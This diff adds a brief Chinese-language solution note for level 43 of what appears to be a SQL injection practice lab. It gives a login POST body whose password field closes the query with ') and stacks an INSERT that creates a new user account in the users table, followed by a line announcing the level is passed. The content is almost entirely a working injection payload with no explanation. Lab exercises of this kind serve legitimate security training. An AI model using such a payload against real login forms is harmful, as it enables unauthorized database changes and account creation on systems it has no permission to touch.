@@ -1,0 +1,9 @@
+第43关
+
+
+密码处')闭合堆叠注入
+login_user=admin&login_password=32'); insert into users(id,username,password)values(112,'qwe','wqr') #&mysubmit=Login
+
+
+
+闯关成功！！！
